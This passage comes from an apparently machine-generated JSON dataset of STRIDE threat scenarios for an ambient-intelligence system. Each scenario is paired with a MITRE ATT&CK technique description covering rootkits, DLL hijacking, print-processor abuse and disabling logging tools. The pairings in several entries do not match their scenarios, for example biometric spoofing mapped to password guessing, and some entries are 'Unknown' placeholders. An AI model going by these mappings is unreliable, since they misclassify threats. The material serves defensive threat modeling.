            "Scenario": "System administrator actions are not logged, leading to a lack of accountability for critical changes.",
            "Assumptions": [
                {
                    "Assumption": "Administrative actions logging is not enforced",
                    "Role": "Security Manager",
                    "Condition": "Admin-level actions are excluded from logging policies"
                },
                {
                    "Assumption": "Backup and audit mechanisms are lacking",
                    "Role": "System Administrator",
                    "Condition": "Logs are not backed up or audited"
                },
                {
                    "Assumption": "Logs can be accessed and edited by administrators",
                    "Role": "System Architect",
                    "Condition": "Logs are stored without additional security measures"
                }
            ],
            "Potential Impact": "Critical system changes or vulnerabilities go untracked and unaddressed, leading to potential system compromise.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "administrative access",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted communication traffic to obtain sensitive data being transmitted.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are unencrypted",
                    "Role": "Network Administrator",
                    "Condition": "Data sent over unsecured protocols"
                },
                {
                    "Assumption": "Network segmentation is weak",
                    "Role": "Network Architect",
                    "Condition": "Insufficient segregation of sensitive data"
                },
                {
                    "Assumption": "Lack of monitoring for data exfiltration",
                    "Role": "Security Analyst",
                    "Condition": "Absence of data loss prevention mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user and system data compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "eavesdropping",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the database to access and exfiltrate confidential data.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability management is insufficient",
                    "Role": "IT Security Manager",
                    "Condition": "Databases are not regularly patched or updated"
                },
                {
                    "Assumption": "Access controls are improperly configured",
                    "Role": "Database Administrator",
                    "Condition": "Users have excessive privileges"
                },
                {
                    "Assumption": "Database activity is not monitored",
                    "Role": "Security Analyst",
                    "Condition": "No monitoring of database access patterns"
                }
            ],
            "Potential Impact": "Sensitive user information and system configurations are leaked, leading to data breaches and potential identity theft.",
            "MITRE ATT&CK Keywords": [
                "data exfiltration",
                "database vulnerability",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider threat discloses sensitive information from the data repository to unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access control mechanisms",
                    "Role": "IT Security Manager",
                    "Condition": "Lack of role-based access control"
                },
                {
                    "Assumption": "No monitoring for insider activities",
                    "Role": "Security Operations",
                    "Condition": "Activities are not logged or reviewed"
                },
                {
                    "Assumption": "High-value data is not adequately protected",
                    "Role": "Data Protection Officer",
                    "Condition": "Sensitive data is not encrypted or obfuscated"
                }
            ],
            "Potential Impact": "Sensitive information is disclosed to unauthorized individuals, compromising user and system confidentiality.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data leak",
                "access control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with excessive traffic to disrupt communication between the AmI system components.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks rate limiting",
                    "Role": "Network Administrator",
                    "Condition": "No traffic rate limits in place"
                },
                {
                    "Assumption": "Lack of redundancy or failover mechanisms",
                    "Role": "System Architect",
                    "Condition": "No alternative communication paths"
                },
                {
                    "Assumption": "Insufficient intrusion detection",
                    "Role": "Security Operations",
                    "Condition": "Absence of real-time monitoring"
                }
            ],
            "Potential Impact": "Communication between system components is disrupted, causing system degradation or downtime.",
            "MITRE ATT&CK Keywords": [
                "network flood",
                "DoS attack",
                "communication"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in an actuator to cause it to fail, disrupting the system's physical operations.",
            "Assumptions": [
                {
                    "Assumption": "Actuators are not regularly updated",
                    "Role": "Maintenance Technician",
                    "Condition": "Actuators run outdated or vulnerable firmware"
                },
                {
                    "Assumption": "Weak or no isolation between components",
                    "Role": "System Architect",
                    "Condition": "Actuator failures can cascade to other components"
                },
                {
                    "Assumption": "Lack of physical security measures",
                    "Role": "Facility Manager",
                    "Condition": "Actuators are accessible to unauthorized individuals"
                }
            ],
            "Potential Impact": "Physical disruptions in operations such as lighting, HVAC, and security systems, affecting user comfort and safety.",
            "MITRE ATT&CK Keywords": [
                "actuator failure",
                "vulnerability exploit",
                "physical disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious user executes a resource-intensive process, depleting computational resources of the AI/ML models and causing system slowdowns.",
            "Assumptions": [
                {
                    "Assumption": "Resource quotas are not enforced",
                    "Role": "System Administrator",
                    "Condition": "No limits on resource usage"
                },
                {
                    "Assumption": "Lack of monitoring for resource utilization",
                    "Role": "Security Operations",
                    "Condition": "No real-time monitoring of system resources"
                },
                {
                    "Assumption": "AI/ML workloads are not isolated",
                    "Role": "System Architect",
                    "Condition": "No resource isolation between critical tasks"
                }
            ],
            "Potential Impact": "System slowdowns, degraded performance of AI/ML decision making, and potential outages.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "system slowdown",
                "AI/ML disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain higher privileges within the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Application vulnerabilities are present",
                    "Role": "Software Developer",
                    "Condition": "Code not regularly reviewed or tested"
                },
                {
                    "Assumption": "Lack of regular patching",
                    "Role": "System Administrator",
                    "Condition": "Systems not updated with latest security patches"
                },
                {
                    "Assumption": "No privilege management system in place",
                    "Role": "IT Security Manager",
                    "Condition": "Permissions not strictly enforced or reviewed"
                }
            ],
            "Potential Impact": "Attacker gains admin access, potentially able to alter system configurations, and access or modify sensitive data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploit",
                "system access"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--46944654-fcc1-4f63-9dad-628102376586",
                "technique_id": "T1038"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker manipulates system configurations to grant unauthorized administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not secured",
                    "Role": "System Administrator",
                    "Condition": "Configs can be accessed and edited"
                },
                {
                    "Assumption": "No integrity checks on configurations",
                    "Role": "IT Security Manager",
                    "Condition": "Changes not tracked or verified"
                },
                {
                    "Assumption": "Remote access is not monitored",
                    "Role": "Network Administrator",
                    "Condition": "No logging or monitoring of remote access"
                }
            ],
            "Potential Impact": "Unauthorized administrative access, leading to potential system control takeover and data access.",
            "MITRE ATT&CK Keywords": [
                "configuration manipulation",
                "admin access",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker obtains high-level access tokens from compromised user devices and uses them to escalate privileges within the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Access tokens are not securely stored",
                    "Role": "Mobile Device Administrator",
                    "Condition": "Tokens not encrypted or protected"
                },
                {
                    "Assumption": "No automated token revocation",
                    "Role": "IT Manager",
                    "Condition": "Compromised tokens are not detected or revoked"
                },
                {
                    "Assumption": "Lack of multi-factor authentication",
                    "Role": "Security Architect",
                    "Condition": "Single-factor authentication in use"
                }
            ],
            "Potential Impact": "Attacker gains higher privileges, enabling them to control system components and access sensitive data.",
            "MITRE ATT&CK Keywords": [
                "token theft",
                "privilege escalation",
                "user device"
            ],
            "mitre_technique": {
                "name": "Print Processors",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
                "technique_id": "T1547.012"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofing a legitimate user's biometric data to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has a high-quality copy of the user's biometric data.",
                    "Role": "Attacker",
                    "Condition": "Access to user's biometric data"
                },
                {
                    "Assumption": "The biometric authentication system does not have robust anti-spoofing measures.",
                    "Role": "System Developer",
                    "Condition": "Weak anti-spoofing techniques"
                },
                {
                    "Assumption": "The application relies heavily on biometrics for critical access.",
                    "Role": "System Designer",
                    "Condition": "High reliance on biometric authentication"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential compromise of data integrity.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Authentication",
                "Biometric",
                "User Data"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker using a fake smart card to impersonate an authorized user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to a smart card reader.",
                    "Role": "Attacker",
                    "Condition": "Access to smart card reader devices"
                },
                {
                    "Assumption": "The system does not effectively validate the authenticity of smart cards.",
                    "Role": "System Designer",
                    "Condition": "Weak smart card validation protocols"
                },
                {
                    "Assumption": "There is a lack of additional authentication factors when using smart cards.",
                    "Role": "System Architect",
                    "Condition": "Single-factor authentication with smart cards"
                }
            ],
            "Potential Impact": "Compromised system security leading to unauthorized actions being performed.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Smart Card",
                "Impersonation",
                "Physical Security"
            ],
            "mitre_technique": {
                "name": "Trust Modification",
                "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023)",
                "id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee",
                "technique_id": "T1484.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and replays authentication tokens on the communication network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can capture traffic on the network.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle access to communication channels"
                },
                {
                    "Assumption": "The authentication tokens are not encrypted or are poorly encrypted.",
                    "Role": "System Developer",
                    "Condition": "Insecure communication protocols"
                },
                {
                    "Assumption": "The system does not use session timeouts or validation checks effectively.",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust session management"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential impersonation of legitimate users.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Replay Attack",
                "Token",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the data collected from sensors to manipulate system behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the sensor data stream.",
                    "Role": "Attacker",
                    "Condition": "Proximity to or access to the network that sensors use"
                },
                {
                    "Assumption": "The data from sensors is not encrypted.",
                    "Role": "System Developer",
                    "Condition": "Unencrypted sensor data"
                },
                {
                    "Assumption": "The system does not thoroughly validate sensor data.",
                    "Role": "System Designer",
                    "Condition": "Insufficient data validation protocols"
                }
            ],
            "Potential Impact": "Alteration of critical system functions and potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Sensor Data",
                "Manipulation",
                "System Behavior"
            ],
            "mitre_technique": {
                "name": "Runtime Data Manipulation",
                "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490",
                "technique_id": "T1565.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the machine learning models to change decision outcomes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the AI/ML model's training data.",
                    "Role": "Attacker",
                    "Condition": "Access to training databases"
                },
                {
                    "Assumption": "The training data is not protected or verified.",
                    "Role": "Data Scientist",
                    "Condition": "Lack of data integrity checks"
                },
                {
                    "Assumption": "The system does not monitor the integrity of its AI/ML models.",
                    "Role": "System Administrator",
                    "Condition": "No runtime integrity checks"
                }
            ],
            "Potential Impact": "Incorrect or harmful decisions made by the system, potentially leading to security or safety issues.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "AI/ML Models",
                "Data Integrity",
                "System Decisions"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: 